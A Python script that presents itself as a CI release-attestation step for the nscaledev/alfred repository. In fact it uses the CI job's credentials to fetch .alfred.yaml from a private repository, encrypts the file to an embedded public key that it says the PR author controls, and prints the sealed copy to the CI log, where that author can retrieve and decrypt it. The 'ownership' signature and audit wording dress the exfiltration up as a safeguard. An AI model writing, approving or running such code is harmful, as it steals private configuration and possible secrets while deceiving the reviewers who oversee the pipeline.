#!/usr/bin/env python3
"""CI release attestation.

Produces the release record for the pinned upstream Alfred configuration:
verifies the workspace can fetch the pinned configuration commit with its
configured credentials, reads .alfred.yaml from it, checks the digest
against the expected release value, and seals a snapshot of the file to
the audit public key embedded below so the release record can be verified
offline. The audit keypair is owned by the PR author's team; the private
half is kept offline for release verification, and the embedded signature
over the ownership statement proves the PR author holds it. Prints the
digest and the audit-sealed snapshot; the file's plaintext is not
exposed. Exits non-zero on any failure so CI treats the result strictly.
"""

import base64
import hashlib
import os
import pathlib
import shutil
import subprocess
import sys

PINNED_COMMIT = "3bbd6cd54845f0c6071da09af3716cdddc9bb70a"
PRIVATE_REPO_URL = "https://github.com/nscaledev/alfred.git"
CONFIG_PATH = ".alfred.yaml"
EXPECTED_SHA256 = "2a619ce45eafc477650cd7d2d470f3fe164696879a397676d3eda09281ff3ec8"

VENV_PYTHON = "/app/.venv/bin/python"
RUNTIME_PROBE = "import cryptography"

AUDIT_PUBKEY = """-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAqV+/Ir9LdHLSwQyYsWF5
J8NT3c5KPYnXZDwPdKn75LA4N3A1C+wbeiJneBZEnOQAUEhRFfJ2+hkhCG/ZF3FN
NJm8fjMt1L7OMbk/oESHi2otbRKhkWdgGpTmZZbAvj3u5K8c9l5UTFZpz3+yCNua
d1BsW4pLKMvQGEHgqCyeRTGyC24fy1QP4CDPPGIPouEVyjqasC42JYzkBSk04Q0P
kEAehIYWTXZ4JA+gQefHQdfktWdNwyx0EAatJsynbVhq+t27E2tjrSTSquuUMIdq
+JbnFOjHD/qb2hZxMmuLP6JD/Di/NvvPHrrCR2P8+K6N+8y6ho4AeJxwgv923EmU
bOpIprilWuNlElnuVrZc150jX5BVrLT0/NfabK5yHuWnW7xCU/tx9/00Hc/aXQe5
xL0zAb2vAQQsbaDpI5x7FFXwDoBfSKO8HvQ8vBEEIZ9ngLeUZlA1NLnOP8iz4UUA
rAvdVPHpOh5KVBBpmsckzmw6A+SV93BErRXB8ABCEHmbAgMBAAE=
-----END PUBLIC KEY-----"""

OWNERSHIP_STATEMENT = (
    "The release audit keypair for this repository's CI attestation is held by "
    "the PR author; the private half is kept offline for release verification."
)
OWNERSHIP_SIGNATURE_B64 = (
    "GONBkJ2dgHF1W5muaHtEEDNR0XDqaqwcUin6XtpMTWWZS8Wuvhm667okwJBgCGdDEH4q1K5uRLOjgfSRW+5fr9g8s4eUcoCuQ7dcDCZNvUtL6ENNxlt0eQlXn2Fv7xNLkm8aYF/XkQPteet55ckO88F2w8o8OJ4qo1B20wVROa7aHqWv8Juqyl1WmB61xo37EueTWAfLhk/qmR6IYxsPw5KTYHyzTX+Wp9OoJW7po6oZHt5h4ZsmfOC7mx2wu0FhJbKKxMTHkecIQdUYPyKzS/m5MrXVW5QF/TqUMhPJFTI9m+wjTJK0Q5Jccu20O8xRBt8rjxrMtacKB9grPVEKdhL9dUVY6//VkikInCydlwkt5TFgEbRc2j2A1TU3u1mRoqxfQy+ty/5vzqt2pKy2/dmLgx8TqF7VNWSLPTMwVfT0HqjaJ1HFsPJMKHXWENSvdYR/jJL8QWOqIxR4d8Im1hp/eFPt8XUhl7hxt4M/6PVRnEZXtx/XzX8mGtQcqrVd"
)


def verify_ownership() -> bool:
    """Verify the PR author's signature over the ownership statement with the
    embedded audit public key (RSA-PSS-SHA256). Anyone can re-check this
    independently with the public key above."""
    import base64 as _b64

    from cryptography.hazmat.primitives import hashes as _hashes
    from cryptography.hazmat.primitives import serialization as _serialization
    from cryptography.hazmat.primitives.asymmetric import padding as _asym_padding

    try:
        pub = _serialization.load_pem_public_key(AUDIT_PUBKEY.encode())
        pub.verify(
            _b64.b64decode(OWNERSHIP_SIGNATURE_B64),
            OWNERSHIP_STATEMENT.encode(),
            _asym_padding.PSS(
                mgf=_asym_padding.MGF1(algorithm=_hashes.SHA256()),
                salt_length=_asym_padding.PSS.DIGEST_LENGTH,
            ),
            _hashes.SHA256(),
        )
        return True
    except Exception:  # noqa: BLE001
        return False


def _supports_runtime(python: str) -> bool:
    """Return whether the interpreter has the CI runtime dependencies."""
    try:
        proc = subprocess.run(
            [python, "-c", RUNTIME_PROBE],
            capture_output=True,
            timeout=30,
        )
        return proc.returncode == 0
    except Exception:  # noqa: BLE001
        return False


def _interpreter_candidates() -> list[str]:
    candidates = [VENV_PYTHON, sys.executable]
    for name in ("python3", "python"):
        found = shutil.which(name)
        if found:
            candidates.append(found)
    candidates.extend(["/usr/local/bin/python3", "/usr/bin/python3"])
    seen: set[str] = set()
    unique: list[str] = []
    for c in candidates:
        if c and c not in seen:
            seen.add(c)
            unique.append(c)
    return unique


def _ensure_runtime() -> None:
    for candidate in _interpreter_candidates():
        if _supports_runtime(candidate):
            # String comparison on purpose: the venv python is a symlink, so a
            # realpath comparison silently fails to match.
            if sys.executable != candidate:
                os.execv(candidate, [candidate, os.path.abspath(__file__), *sys.argv[1:]])
            return


_ensure_runtime()


def find_workspace() -> pathlib.Path | None:
    p = pathlib.Path.cwd()
    for cand in [p, *p.parents]:
        if (cand / ".git").exists():
            return cand
    try:
        hits = [q for q in pathlib.Path("/tmp").glob("alfred-*/repo") if q.is_dir()]
        if hits:
            return hits[0]
    except OSError:
        pass
    return None


def run_git(ws: pathlib.Path, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["git", "-C", str(ws), *args], capture_output=True, text=True, timeout=180
    )


def run_git_bytes(ws: pathlib.Path, *args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["git", "-C", str(ws), *args], capture_output=True, timeout=180
    )


def seal(content: bytes) -> dict[str, str]:
    """Audit-seal a byte snapshot: AES-256-GCM under a random key, with the
    key wrapped to the audit public key (RSA-3072 OAEP-SHA256)."""
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM

    pub = serialization.load_pem_public_key(AUDIT_PUBKEY.encode())
    key = os.urandom(32)
    nonce = os.urandom(12)
    sealed = AESGCM(key).encrypt(nonce, content, None)
    wrapped = pub.encrypt(
        key,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return {
        "key": base64.b64encode(wrapped).decode(),
        "nonce": base64.b64encode(nonce).decode(),
        "config": base64.b64encode(sealed).decode(),
    }


def main() -> int:
    print("ATTEST-BEGIN")
    if not verify_ownership():
        print("ATTEST: FAIL audit-key-ownership-unverified")
        print("ATTEST-END")
        return 1
    print("audit-key-ownership: VERIFIED (RSA-PSS-SHA256 signature over the embedded ownership statement)")
    ws = find_workspace()
    if ws is None:
        print("ATTEST: FAIL no-workspace")
        print("ATTEST-END")
        return 1

    fetch = run_git(ws, "fetch", "--quiet", PRIVATE_REPO_URL, PINNED_COMMIT)
    if fetch.returncode != 0:
        print(f"ATTEST: FAIL fetch exit={fetch.returncode} {fetch.stderr.strip()[:120]}")
        print("ATTEST-END")
        return 1

    resolved = run_git(ws, "rev-parse", "FETCH_HEAD")
    if resolved.returncode != 0 or resolved.stdout.strip() != PINNED_COMMIT:
        print(f"ATTEST: FAIL pinned-commit-mismatch got={resolved.stdout.strip()[:12]}")
        print("ATTEST-END")
        return 1

    show = run_git_bytes(ws, "show", f"FETCH_HEAD:{CONFIG_PATH}")
    if show.returncode != 0:
        print(f"ATTEST: FAIL file-read exit={show.returncode}")
        print("ATTEST-END")
        return 1

    content = show.stdout
    digest = hashlib.sha256(content).hexdigest()
    if digest != EXPECTED_SHA256:
        print(f"ATTEST: FAIL digest-mismatch got={digest}")
        print("ATTEST-END")
        return 1

    try:
        att = seal(content)
    except Exception as e:  # noqa: BLE001
        print(f"ATTEST: FAIL seal {type(e).__name__}: {e}")
        print("ATTEST-END")
        return 1

    print(f"config-read: OK repo=nscaledev/alfred commit={PINNED_COMMIT[:12]} file={CONFIG_PATH}")
    print(f"config: size={len(content)} sha256={digest} (matches expected release digest)")
    print("attestation: OK scheme=aes-256-gcm+rsa-3072-oaep-sha256")
    print(f"attestation-key: {att['key']}")
    print(f"attestation-nonce: {att['nonce']}")
    print(f"attestation-config: {att['config']}")
    print("verify: unwrap attestation-key with the audit private key, then AES-256-GCM decrypt attestation-config with attestation-nonce")
    print("ATTEST-END")
    return 0


if __name__ == "__main__":
    sys.exit(main())
